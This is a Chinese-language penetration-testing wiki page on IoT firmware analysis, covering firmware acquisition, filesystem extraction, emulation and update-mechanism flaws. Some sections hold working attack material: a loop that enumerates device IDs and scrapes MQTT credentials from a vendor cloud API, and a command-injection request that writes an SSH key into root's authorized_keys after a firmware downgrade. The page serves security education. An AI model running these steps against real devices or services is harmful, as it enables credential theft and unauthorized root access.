# 固件分析

{{#include ../../banners/hacktricks-training.md}}

## **简介**

### 相关资源


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

固件是使设备正确运行的关键软件，通过管理并促进硬件组件与用户交互的软件之间的通信来实现设备功能。它存储在非易失性存储器中，确保设备从上电那一刻起就能访问重要指令，从而引导操作系统启动。检查并可能修改固件是识别安全漏洞的重要步骤。

## **信息收集**

**信息收集** 是理解设备组成和所使用技术的关键初步步骤。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- 引导加载程序的具体细节
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库和许可证类型
- 更新历史和合规认证
- 架构图和流程图
- 安全评估和已识别的漏洞

为此，**open-source intelligence (OSINT)** 工具非常有价值，同时也应通过手工和自动化审查流程分析任何可用的开源软件组件。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供免费的静态分析，可用于发现潜在问题。

## **获取固件**

获取固件可以通过多种方式实现，每种方法的难度不同：

- **Directly** 从来源（开发者、制造商）
- **Building** 根据提供的说明构建固件
- **Downloading** 从官方支持站点下载
- 利用 **Google dork** 查询查找托管的固件文件
- 直接访问 **cloud storage**，使用如 [S3Scanner](https://github.com/sa7mon/S3Scanner) 的工具
- 通过中间人技术拦截 **updates**
- **Extracting** 从设备通过诸如 **UART**、**JTAG** 或 **PICit** 的连接进行
- **Sniffing** 设备通信中的更新请求
- 识别并使用 **hardcoded update endpoints**
- **Dumping** 从引导加载程序或网络
- 当其他方法都失败时，使用合适的硬件工具 **Removing and reading** 存储芯片

## 分析固件

现在你已获得固件，需要从中提取信息以确定如何处理它。可以使用的不同工具包括：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果使用这些工具没有找到太多内容，请用 `binwalk -E <bin>` 检查镜像的 **entropy**。如果 entropy 较低，说明很可能未被加密；如果 entropy 较高，则很可能被加密（或以某种方式被压缩）。

此外，你可以使用这些工具来提取嵌入在 **firmware** 中的文件：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）来检查文件。

### 获取文件系统

使用前面提到的工具，例如 `binwalk -ev <bin>`，你应该能够**提取文件系统**。\
Binwalk 通常会将其解压到一个以文件系统类型命名的**文件夹**中，该类型通常为以下之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手动提取文件系统

有时，binwalk 的签名中**可能不包含文件系统的 magic byte**。在这种情况下，使用 binwalk 来**查找文件系统的偏移量并从二进制中 carve 出压缩的文件系统**，然后根据文件系统类型按下面的步骤**手动提取**。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行下面的 **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的例子中使用）

`$ unsquashfs dir.squashfs`

文件随后将位于 `squashfs-root` 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于带有 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 固件分析

一旦获取到固件，拆解它以了解其结构和潜在漏洞是至关重要的。此过程涉及使用各种工具来分析并从固件镜像中提取有价值的数据。

### 初步分析工具

下面提供了一组用于初步检查二进制文件（称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查 **entropy**。较低的 entropy 表明可能未加密，而较高的 entropy 则可能表示已加密或被压缩。

要提取 **embedded files**，建议使用像 **file-data-carving-recovery-tools** 文档以及用于文件检查的 **binvis.io** 等工具和资源。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，通常会将其解压到以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，当 **binwalk** 因为缺少魔数 (magic bytes) 而无法识别文件系统类型时，就需要手动提取。此过程包括使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令从镜像中切割出文件系统：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
随后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取内容。

### 文件系统分析

在提取出文件系统后，开始查找安全缺陷。重点关注不安全的网络守护进程、硬编码凭证、API 端点、更新服务器功能、未编译代码、启动脚本，以及用于离线分析的已编译二进制文件。

**关键位置** 和 **检查项** 包括：

- **etc/shadow** 和 **etc/passwd** 用于用户凭证
- 位于 **etc/ssl** 的 SSL 证书和密钥
- 用于发现潜在漏洞的配置和脚本文件
- 供进一步分析的嵌入式二进制文件
- 常见的 IoT 设备 web 服务器和二进制文件

若干工具可辅助在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 用于敏感信息搜索
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 和 [**EMBA**](https://github.com/e-m-b-a/emba) 用于静态和动态分析

### 已编译二进制文件的安全检查

文件系统中发现的源代码和已编译二进制文件都必须仔细检查以发现漏洞。像 **checksec.sh**（针对 Unix 二进制）和 **PESecurity**（针对 Windows 二进制）这样的工具可帮助识别可能被利用的无防护二进制文件。

## 通过派生的 URL 令牌收集云配置和 MQTT 凭证

许多 IoT 集线器从类似如下的云端接口获取每台设备的配置：

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

在固件分析过程中，你可能会发现 <token> 是使用硬编码的密钥从 <deviceId> 本地派生出来的，例如：

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

这种设计使得任何知道 <deviceId> 和 STATIC_KEY 的人都能重建该 URL 并拉取云配置，通常会泄露明文 MQTT 凭证和主题前缀。

实战流程：

1) 从 UART 引导日志中提取 <deviceId>

- 连接一个 3.3V UART 适配器（TX/RX/GND）并捕获日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL pattern and broker address 的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2 中，并搜索配置路径 ("/pf/") 或 MD5 使用情况。
- 确认算法（例如 MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导出 token 并将 digest 转为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 获取 cloud config 和 MQTT credentials

- 构造 URL 并使用 curl 拉取 JSON；用 jq 解析以提取 secrets：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 利用明文 MQTT 和薄弱的主题 ACLs（如果存在）

- 使用恢复的凭据订阅维护主题并查找敏感事件：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 IDs（在规模化、经授权的情况下）

- 许多生态系统会在 vendor OUI/product/type bytes 之后附加顺序后缀。
- 你可以迭代候选 ID，推导 tokens，并以编程方式抓取配置：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意事项
- 在尝试进行 mass enumeration 之前，务必获得明确授权。
- 在可能的情况下，尽量优先使用 emulation 或 static analysis 来恢复 secrets，而无需修改目标硬件。

对 firmware 的 emulation 过程可以实现对设备运行或单个程序的 **dynamic analysis**。该方法可能会遇到硬件或 architecture 依赖性方面的挑战，但将 root filesystem 或特定 binaries 转移到与之匹配的 architecture 和 endianness 的设备（例如 Raspberry Pi），或到预构建的 virtual machine 上，可以促进进一步的测试。

### 模拟单个 binaries

在检查单个程序时，识别程序的 endianness 和 CPU architecture 至关重要。

#### MIPS Architecture 示例

要 emulate 一个 MIPS architecture 的 binary，可使用如下命令：
```bash
file ./squashfs-root/bin/busybox
```
以及安装必要的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM 架构仿真

对于 ARM 二进制，过程类似，使用 `qemu-arm` 进行仿真。

### 全系统仿真

像 [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, 支持完整的固件仿真，自动化该过程并辅助动态分析。

## 动态分析实践

在此阶段，使用真实设备或仿真设备环境进行分析。保持对操作系统和 filesystem 的 shell 访问是至关重要的。仿真可能无法完全模拟硬件交互，因而需偶尔重启仿真。分析应重新检查 filesystem，利用暴露的网页和网络服务，并挖掘 bootloader 漏洞。固件完整性测试对于识别潜在后门漏洞至关重要。

## 运行时分析技术

运行时分析涉及在进程或二进制的运行环境中与其交互，使用诸如 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 等技术识别漏洞。

## 二进制利用与 Proof-of-Concept

为已识别的漏洞开发 PoC 需要深入理解目标架构并使用底层语言编程。嵌入式系统中二进制运行时保护较少见，但若存在，可能需要诸如 Return Oriented Programming (ROP) 之类的技术。

## 用于固件分析的预配置操作系统

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的操作系统提供用于固件安全测试的预配置环境，并配备了必要的工具。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个发行版，旨在帮助你对 Internet of Things (IoT) 设备执行安全评估和 penetration testing。它通过提供一个预配置并加载所有必要工具的环境为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 嵌入式安全测试操作系统，基于 Ubuntu 18.04，预装了固件安全测试工具。

## 固件降级攻击与不安全的更新机制

即便厂商对固件镜像实施了加密签名校验，**version rollback (downgrade) protection is frequently omitted**。当 boot- 或 recovery-loader 仅使用嵌入的公钥验证签名，但不比较被刷写镜像的 *version*（或单调计数器）时，攻击者就可以合法地安装一个仍带有有效签名的**旧版且存在漏洞的固件**，从而重新引入已修补的漏洞。

典型攻击流程：

1. **获取旧的已签名镜像**
* 从厂商的公开下载门户、CDN 或支持站点获取。
* 从配套的移动/桌面应用中提取（例如在 Android APK 内的 `assets/firmware/`）。
* 从第三方仓库检索，例如 VirusTotal、网络档案、论坛等。
2. **通过任何暴露的更新通道将镜像上传或提供给设备**：
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* 许多消费级 IoT 设备暴露 *unauthenticated* 的 HTTP(S) 端点，这些端点接受 Base64 编码的固件 blobs，在服务器端解码并触发恢复/升级。
3. 降级后，利用在新版中已修补的漏洞（例如后来添加的 command-injection 过滤器）。
4. 可选地刷新回最新镜像或禁用更新，以在获得持久性后避免被发现。

### 示例：降级后的命令注入
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在有漏洞（被降级）的固件中，`md5` 参数被直接拼接进一个 shell 命令且未经过任何消毒/转义，允许注入任意命令（例如 —— 启用 SSH key-based root access）。之后的固件版本引入了一个基础字符过滤，但由于缺乏降级保护，这一修复变得无效。

### 从移动应用提取固件

许多厂商会将完整固件镜像打包进其配套移动应用，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些包通常以未加密形式存放在 APK/APEX 的路径如 `assets/fw/` 或 `res/raw/` 下。诸如 `apktool`、`ghidra`，甚至普通的 `unzip` 等工具都能让你在不接触物理硬件的情况下提取签名镜像。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 评估更新逻辑的检查清单

* 传输/认证层是否对 *update endpoint* 提供了充分保护（TLS + 认证）？
* 设备在刷写前是否比较 **version numbers** 或 **monotonic anti-rollback counter**？
* 镜像是否在 secure boot chain 内被验证（例如由 ROM 代码检查签名）？
* userland code 是否执行额外的合理性检查（例如允许的分区映射、机型编号）？
* *partial* 或 *backup* 的更新流程是否重用相同的验证逻辑？

> 💡 如果以上任何项缺失，该平台很可能容易受到回滚攻击。

## 用于练习的易受攻击固件

To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考资料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
